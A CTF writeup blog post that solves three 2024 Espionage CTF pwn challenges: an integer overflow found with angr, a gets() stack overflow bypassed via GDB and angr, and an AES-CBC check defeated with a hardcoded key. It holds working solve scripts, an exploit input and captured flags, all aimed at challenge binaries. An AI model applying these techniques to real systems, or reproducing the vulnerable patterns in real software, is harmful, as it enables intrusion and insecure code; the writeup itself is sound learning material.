---
title: ISSessions Espionage CTF 2024 - pwn challenge writeups
slug: espionage-pwn-2024
date: 2024-01-28
author: drec
description: crazy solutions inside
---

# Espionage CTF Pwn challenge writeups

This is a writeup for the pwn challenges in the Espionage CTF 2024.
This is also the first time I'm doing an in-person CTF event this year,
and first win in a CTF event ever!

I played as a member of UofTCTF, a CTF team from the University of Toronto.

Members:
- drec (that's me) - pwn; uses ntr for "nice try", anal for "analyze"; writes ["love letters"](https://en.wikipedia.org/wiki/ILOVEYOU)
- __fastcall - rev guy; "I am twelve" but doesn't get banned on Twitch; does it for [her](https://en.wikipedia.org/wiki/Interactive_Disassembler#/media/File:Mme_de_Maintenon.jpg)
- Tyler_ - forensics, OSINT; sleeps on time; did gym and ctf at the same time, still first blooded a challenge
- SteakEnthusiast - web god; speedruns with large language models

## Meltdown (15 points)

My teammate actually solved this,
so this is my upsolve of the Meltdown challenge.

Here is the code for the challenge.

```c
#include <stdio.h>
#include <stdlib.h>
int BUFFER_SIZE = 256;

int main(){
  // char flag[BUFFER_SIZE];
  // FILE *flagfp = fopen("./flag.txt", "r");
  // fgets(flag, BUFFER_SIZE, flagfp);
  
    printf("Welcome to the reactor's admin interface!\n");
    int done = 0;
    int fTemp = 70;
    char input[BUFFER_SIZE];
    
    while(done == 0){
        int choice;
        int cTemp;
        printf("What temperature would you like to set the reactor to? (Celsius)\n");
        fflush(stdout);
        
        if (fgets(input, BUFFER_SIZE, stdin) == NULL) {
            perror("Error reading input");
            continue;
        }
        if (sscanf(input, "%d", &cTemp) != 1) {
            printf("Invalid input. Please enter a number.\n\n");
            continue;
        }

        if(cTemp < 500){
            //whose idea was it to take celsius input and then convert to fahrenheit??????????
            fTemp = cTemp * 2 + 32;
            if(fTemp > 2000000000){
                printf("temperature is %d degress F\n\n", fTemp);
                printf("AAAAAAAAAAAAAAAAAAAAH TOO HOT!!!!!!\n");
                // puts(flag);
                done = 1;
            }else{
                printf("temperature is %d degress F\n\n", fTemp);
            }
                
            }else{
                printf("Woah! Too hot, could not change\n\n");
            }
    }
    
    return 0;
}
```

You may have noticed that I have commented out the flag-related stuff, but don't worry!
we'll just need to use the output to tell if we were successful
in triggering the vulnerability.

In this challenge, there exists an integer underflow vulnerability,
concerning the variable `fTemp`.
The program asks for a number, and parses it as a signed integer.
This is stored in the variable `cTemp`.
Then, `fTemp` is set to `cTemp * 2 + 32`.

If `cTemp` is negative, then `fTemp` will be negative, right?
Well, not quite.
If we can make `cTemp` negative enough,
then `cTemp * 2` will underflow, and the result will be positive.

### How can `fTemp` be positive?

If we have a signed integer,
then the most significant bit is the sign bit.
When we multiply by 2, depending on the compiler's choice of implementation,
the most significant bit may be shifted out. If the bit next to the original sign
bit is 0, then the result will be positive, because it gets shifted to the left,
where the original sign bit was. After that, adding 32 should not change the sign bit,
which is easy to make sure of.

Here is an example code to see what I mean here:

```c
#include <stdio.h>

int main() {
	char a = -65;
    // This prints 10111111
	printf("%08hhb\n", a);
	a *= 2;
    // This prints 01111110, so everything gets shifted to the left
    // and the sign bit is replaced with a 0
	printf("%08hhb\n", a);
}
```

### How did I find an input that will trigger the vulnerability?

We can use a tool called angr to find an input that triggers the vulnerability.

angr is a symbolic execution engine, which means that it will run the program,
but instead of using concrete (real) values, it will use symbolic values
(like variables in your algebra class).

When angr's simulation manager reaches a conditional branch,
it will try to go down both paths, and track down the constraints
that will make the program go down that path.

In this case, we want to find an input that will make the program go down
the path where `fTemp` is positive.
In that path, the program will print `AAAAAAAAAAAAAAAAAAAAH TOO HOT!!!!!!`,
so we can tell angr to find an input that will make the program print that.

I also noted that if the word `input` is printed, then the program will not
actually print `AAAAAAAAAAAAAAAAAAAAH TOO HOT!!!!!!`, so we can tell angr
to avoid any states where the word `input` is printed.

```py
import angr
import sys

proj = angr.Project('./meltdown')

simgr = proj.factory.simgr()

def target_state(state):
    return b'TOO HOT' in state.posix.dumps(sys.stdout.fileno())

def avoid_state(state):
    return b'input' in state.posix.dumps(sys.stdout.fileno())

simgr.explore(find=target_state, avoid=avoid_state)

if simgr.found:
    print(simgr.found[0].posix.dumps(sys.stdin.fileno()))
else:
    print('Not found')
```

Running the script, and we get the input we need, and then some.

```
$ python angy.py
b'-1094000000\xda\xba\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

Notice that there are a lot of null bytes in the input. This is because `fgets`
has a huge buffer size, but we don't need to fill the whole buffer.
angr just filled the rest of the buffer with null bytes.

Also, the `\xda\xba` is actually not parsed as part of the integer, so we can ignore it as well.
This is probably a result of previous work done by angr, and since the program doesn't read it,
it left the bytes there. Note that `sscanf` will only read the numeric part of the input (for `%d`),
and it stops reading for `%d` when it encounters a non-numeric character.

To conclude, the input we really need is `-1094000000`.

```
$ ./meltdown
Welcome to the reactor's admin interface!
What temperature would you like to set the reactor to? (Celsius)
-1094000000
temperature is 2106967328 degress F

AAAAAAAAAAAAAAAAAAAAH TOO HOT!!!!!!
```

## Overflow depth (15 points)

This challenge is a buffer overflow challenge, or at least it seems like it.

We were given a file that is a 32-bit ELF executable. Take note that
it is also a PIE executable, so the addresses will be randomized.

The vulnerability is in the `handle_communication` function.
It does a call to `gets`, which is a function that reads a line from stdin,
and stores it in the buffer that is passed as an argument.

The buffer is allocated on the stack, and it is 0x48 bytes long.
Writing 0x8 bytes after the buffer will overwrite
the entire return address of the function.

```
gef➤  disas handle_communication
Dump of assembler code for function handle_communication:
   0x00001303 <+0>:     push   ebp
   0x00001304 <+1>:     mov    ebp,esp
   0x00001306 <+3>:     push   ebx
   0x00001307 <+4>:     sub    esp,0x44
   0x0000130a <+7>:     call   0x10b0 <__x86.get_pc_thunk.bx>
   0x0000130f <+12>:    add    ebx,0x2ce5
   0x00001315 <+18>:    sub    esp,0xc
   0x00001318 <+21>:    lea    eax,[ebx-0x1fb8]
   0x0000131e <+27>:    push   eax
   0x0000131f <+28>:    call   0x1040 <printf@plt>
   0x00001324 <+33>:    add    esp,0x10
   0x00001327 <+36>:    sub    esp,0xc
   0x0000132a <+39>:    lea    eax,[ebp-0x48]
   0x0000132d <+42>:    push   eax
   0x0000132e <+43>:    call   0x1050 <gets@plt>
   0x00001333 <+48>:    add    esp,0x10
   0x00001336 <+51>:    sub    esp,0xc
   0x00001339 <+54>:    lea    eax,[ebx-0x1f98]
   0x0000133f <+60>:    push   eax
   0x00001340 <+61>:    call   0x1060 <puts@plt>
   0x00001345 <+66>:    add    esp,0x10
   0x00001348 <+69>:    nop
   0x00001349 <+70>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x0000134c <+73>:    leave
   0x0000134d <+74>:    ret
End of assembler dump.
```

### How did we know the details of the vulnerability?

First, `gets` is a function that is known to be vulnerable.
The dynamic linker will warn us about this should we compile a program
that uses `gets`.

Second before the call to `gets`, the address of the buffer is loaded into `eax`.
This is the address of the buffer that `gets` will write to.
In this case, it is `ebp-0x48`. This means that the buffer is 0x48 bytes away from
the saved base pointer (ebp). Writing 4 bytes after the buffer will overwrite the
saved base pointer, then another 4 bytes will overwrite the return address.

Here's the layout of the stack, from the buffer, to the return address:

```
[ 0x48 bytes buffer ] [ 0x4 bytes saved base pointer ] [ 0x4 bytes return address ]
```

### How can we exploit the vulnerability?

In this case, you can write 0x4c bytes first, then overwrite the return address
to the address of `secret_spy_function`, which prints the flag.

There is a problem, though. The executable is PIE, so the address of `secret_spy_function`
is randomized, along with all the other addresses of the function. You can combat
this in two ways:

1. Disable ASLR, so that the addresses are not randomized. You will still need to know the
    base address of the executable, and calculate the address of `secret_spy_function`.
    The good thing is that the address of the target function will be the same every time
    you run the program.
2. Only overwrite the necessary bytes to overwrite. Usually the return address is 4 bytes,
    but because the offsets are next to each other, you can try to just overwrite the
    2 least significant bytes of the return address. You can figure out why we need two
    instead of one by looking at the disassembly of the function (check the offsets of the
    instructions).

### How did I get the flag?

Another way of solving is to not overwrite the return address at all.
Instead, find a way to run the `secret_spy_function` on its own, not caring about the
rest of the program.

#### By way of GDB

In GDB, you can set registers to whatever you want, during runtime, at any point
of execution.
This means that you can control EIP to whatever address, and GDB will obey.
EIP is the instruction pointer, which is the register that stores the address of
the next instruction to be executed.

This means that you can do the following in GDB:

```
start
print secret_spy_function
set $eip = fn_address_here
continue
```

The first command starts at a reasonable entry point of the program.
The second command prints the address of the target function.
The third command sets the instruction pointer to the address of the target function;
just replace `fn_address_here` with the address of the target function.
The fourth command continues execution, and the target function will be executed.

If you do it this way, you will get a SIGSEGV (a segmentation fault).
This is fine. What matters is the output of the program, which contains the flag.

#### By way of angr

angr can also be used to solve this challenge.
This time, we can set the starting address to the address of the target function,
and then run the program from there.

```py
import angr
import sys

proj = angr.Project('./ctf_challenge')

state = proj.factory.call_state(proj.loader.find_symbol('secret_spy_function').rebased_addr)

simgr = proj.factory.simulation_manager(state)

simgr.run()

print(simgr.deadended[0].posix.dumps(sys.stdout.fileno()))
```

When you run the script, you will get the flag.

```
$ python angy.py
WARNING  | 2024-01-28 20:15:04,660 | angr.calling_conventions | Guessing call prototype. Please specify prototype.
WARNING  | 2024-01-28 20:15:04,671 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing register with an unspecified value. This could indicate unwanted behavior.
WARNING  | 2024-01-28 20:15:04,672 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:
WARNING  | 2024-01-28 20:15:04,672 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state
WARNING  | 2024-01-28 20:15:04,672 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null
WARNING  | 2024-01-28 20:15:04,672 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.
WARNING  | 2024-01-28 20:15:04,672 | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp with 4 unconstrained bytes referenced from 0x4011f4 (secret_spy_function+0x0 in ctf_challenge (0x11f4))
WARNING  | 2024-01-28 20:15:04,673 | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx with 4 unconstrained bytes referenced from 0x4011f7 (secret_spy_function+0x3 in ctf_challenge (0x11f7))
WARNING  | 2024-01-28 20:15:05,277 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffefff0 with 4 unconstrained bytes referenced from 0x556fb0 (_IO_printf+0x0 in libc.so.6 (0x56fb0))
WARNING  | 2024-01-28 20:15:05,278 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fff0000 with 106 unconstrained bytes referenced from 0x556fb0 (_IO_printf+0x0 in libc.so.6 (0x56fb0))
b'Access Granted! The secret code is: EspionageCTF{0v3rfl0w_D3ptH_9xi7Q2v}\n'
```

Note: The only reason that the GDB and angr solutions were possible is because the program contains
the `secret_spy_function` function, which prints the flag. If the function drops a shell
instead, and the executable is hosted on a remote server, then you will need to find a way to
do the buffer overflow, in order to trigger the `secret_spy_function`, and get the flag
using the dropped shell.

## Paddingtly Insane (97 points)

Now this one is a bit more interesting. It has something to do with cryptography,
and how we pad encrypted messages.

I actually learned about how AES-CBC works from work last week,
so I was able to solve this challenge pretty quickly, and get first blood!

### What is AES-CBC, and block ciphers?

AES, or Advanced Encryption Standard, is a symmetric-key block cipher.
CBC, or Cipher Block Chaining, is a mode of operation for block ciphers like AES.

If you didn't know, AES-CBC is used in TLS, which is the protocol that secures
your connection to websites that use HTTPS.

How does it work? Well, first, we need to know what a block cipher is.

A block cipher is a cipher that encrypts a fixed-size block of data.
In this case, 128-bit AES encrypts 16 bytes of data at a time.

CBC is a mode of operation for block ciphers. It tells us how to encrypt
the *next* block of data, given the previous block of data.

AES-CBC tells us to XOR the previous block of data with the current block of data,
then encrypts the result using AES.

### Now why do we need to know this? PKCS#7 is why.

PKCS#7 is a way to pad messages to a multiple of the block size.

Imagine that we have a message that is 13 bytes long, and we want to encrypt it
using AES-CBC. We can't encrypt it directly, because the message is not a multiple
of 16 bytes. We need to pad it first.

We can pad it with 3 null bytes, but how are we going to know how many null bytes
are there used for the padding? Also, what if the message already ends with null bytes?
We'll have no way of knowing how many null bytes are used for padding.

This is where PKCS#7 comes in. It tells us how many bytes are used for padding,
and it also tells us what the padding bytes are.

It is actually very simple. The number of padding bytes is equal to the byte value
of the padding bytes. For example, if we need to pad 3 bytes, then we pad our
encrypted message with 3 bytes of the value 3.

[ 13 bytes encrypted data ] [0x03 0x03 0x03]

Now we know that there are 3 bytes of padding, and we know what the padding bytes are.
What if the message is already a multiple of the block size? Then we need to add
a whole block of padding bytes.

[ 16 bytes encrypted data ] [0x10 bytes of 0x10]

Now, if we want to decrypt the message, we can just look at the last byte of the
decrypted message, and see how many bytes we need to remove.

### Exploit idea

The program is written in C#.

```cs
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

class MainReturnValTest
{
    static String Authenticate(string id)
    {
        String val = String.Empty; 
        Aes algo = Aes.Create();
        algo.KeySize = 128;
        algo.Key = new byte[] { 0x23, 0xB6, 0x49, 0xEA, 0x0B, 0x06, 0xAD, 0xBF, 0x61, 0x0f, 0x5D, 0xF3, 0xF0, 0x3D, 0xAF, 0xC3, 0xE2, 0x7A, 0xA4, 0xB7, 0x02, 0x9d, 0xC8, 0x43, 0x93, 0xE9, 0x42, 0xE7, 0xE0, 0xCB, 0xDB, 0x3A };
        algo.IV = new byte[] { 0xC4, 0x90, 0xFD, 0xC4, 0x93, 0xED, 0x36, 0xA4, 0x8A, 0xCD, 0xA2, 0xB1, 0xAB, 0x80, 0x18, 0x6A };

        //Begin Authentication
        try
        {
            byte[] cipherText = ConvertToBytes(id);

            algo.DecryptCbc(cipherText, algo.IV, System.Security.Cryptography.PaddingMode.PKCS7);
            val = "authenticated";
            return val;
        }
        catch (System.Security.Cryptography.CryptographicException e)
        {
            Console.WriteLine(e.Message);
        }
        Console.WriteLine(val);
        return val;
    }


    static byte[] ConvertToBytes(String payload)
    {
        byte[] bytes = payload.Select(c => (byte)c).ToArray();

        return bytes;
    }

    static void Main(string[] args)
    {
        Console.WriteLine("Welcome to the Flag Storage Facility. Please enter your 32-character, encrypted, authentication string to access the flag:");
        String result = Authenticate(args[0]);

        if (!String.IsNullOrEmpty(result)){
            Console.WriteLine("Welcome to the Flag Storage Facility!");
            Console.WriteLine(args[0]);
            Console.WriteLine("EspionageCTF{NOT_THE_FLAG}");
        }
    }
}
```

The program reads the first argument, and is treated as the encrypted message.
It then decrypts the message, and prints the decrypted message.

The key and IV (initial vector) are hardcoded, so we can just use the same key and IV to decrypt
the message ourselves (remember, AES is a symmetric-key cipher, so the same key
can be used for decryption).

If the decryption is successful, then the function `Authenticate` will return the string
`authenticated`, and the program will print the flag, because `result` is not empty.
If the decryption is unsuccessful, then the function will return an empty string,
and the program will not print the flag. Instead, it will error out.

Now give yourself some time to think about how we can exploit this.

... You done? Good.

If you haven't noticed, the program prints the decrypted message, regardless of whether
the authentication is successful or not. This means that we can just give it any encrypted
message, and it will print the decrypted message. That is enough to get the flag,
because the flag has nothing to do with the message.

### Exploit the "lame" way - encrypt your own message

The intended solution - the "cool" way - is to play around the padding bytes,
and somehow brute force the last byte of the message, and see if the padding is valid.

I'm not going to explain this, because I don't know how to do it myself. Contact
the challenge author if you want to know how to do this.

My solution - the "lame" way - is to exploit the fact that AES is a symmetric-key cipher,
and the key and IV were given to us. This means that we can encrypt any message
we want, and the program can decrypt it for us. After all, our only goal
is to not cause a `CryptographicException`.

And with that being said, I implemented the encryption function in C#,
inside the `MainReturnValTest` class of the challenge source code.

```cs
static String encrypt(string id) {
    Aes algo = Aes.Create();
    algo.KeySize = 128;
    algo.Key = new byte[] { 0x23, 0xB6, 0x49, 0xEA, 0x0B, 0x06, 0xAD, 0xBF, 0x61, 0x0f, 0x5D, 0xF3, 0xF0, 0x3D, 0xAF, 0xC3, 0xE2, 0x7A, 0xA4, 0xB7, 0x02, 0x9d, 0xC8, 0x43, 0x93, 0xE9, 0x42, 0xE7, 0xE0, 0xCB, 0xDB, 0x3A };
    algo.IV = new byte[] { 0xC4, 0x90, 0xFD, 0xC4, 0x93, 0xED, 0x36, 0xA4, 0x8A, 0xCD, 0xA2, 0xB1, 0xAB, 0x80, 0x18, 0x6A };

    byte[] plainText = ConvertToBytes(id);
    byte[] cipherText = algo.EncryptCbc(plainText, algo.IV, System.Security.Cryptography.PaddingMode.PKCS7);

    return ConvertToString(cipherText);
}

static String ConvertToString(byte[] bytes)
{
    String payload = String.Empty;
    foreach (byte b in bytes)
    {
        payload += (char)b;
    }
    return payload;
}
```

The `encrypt` function takes a string, and returns the encrypted string.
The `ConvertToString` function converts a byte array to an ANSI string.
I did it that way so I have less fear of encoding issues.

Now I modified the `Main` function to encrypt *almost* any message I want
stored in a variable, and use that as the argument to `Authenticate`.

```cs
String wee = encrypt("admin"); // this fails btw lol

String result = Authenticate(wee);
```

As you can see in the comment above, the encryption of the string `admin` fails
to authenticate. This is because the encrypted message ends with a newline character,
and the program hosted on the server does not like that. The server reads till the newline,
but doesn't include the newline in the message, so the padding is invalid.

To fix this, just don't use a message that encrypts to a data that doesn't contain a newline.

```cs
static void Main(string[] args)
{
    String wee = encrypt("0");
    String result = Authenticate(wee);

    if (String.IsNullOrEmpty(result)) {
        return;
    }

    if (wee.Contains("\n")) {
        Console.WriteLine("encrypted message contains newline");
        return;
    }

    using TcpClient client = new TcpClient("paddingtlyinsane.ctf.issessions.ca", 7777);
    using NetworkStream stream = client.GetStream();
    using StreamReader reader = new StreamReader(stream);
    using StreamWriter writer = new StreamWriter(stream);

    String? line = reader.ReadLine(); // welcome and input prompt

    Console.WriteLine("Sending payload");
    writer.Write(wee);
    writer.Flush();
    Console.WriteLine("Payload sent");

    reader.ReadLine(); // the welcome message
    reader.ReadLine(); // your input
    String? flag = reader.ReadLine();
    Console.WriteLine(flag);
}
```

If we run the program, we get the flag.

```
$ dotnet run --project .
Sending payload
Payload sent
EspionageCTF{Encrypt3d_N0t_auth3nticat3d}
```

## Conclusion

I hope you enjoyed reading this writeup, and I hope you learned something from it.
Shoutouts to ISSessions for hosting this CTF, and shoutouts to the challenge authors
for making these challenges.

And with that, the pwn is done. Look forward to a writeup for ScrambledSquares,
but I'll have to do it later, when my 8-year-old brother can understand it; that is,
when he nods at every sentence I explain to him.

__fastcall will be writing the writeup for ScrambledSquares as well, and I would
suggest you look forward to it if you have experience in reverse engineering.
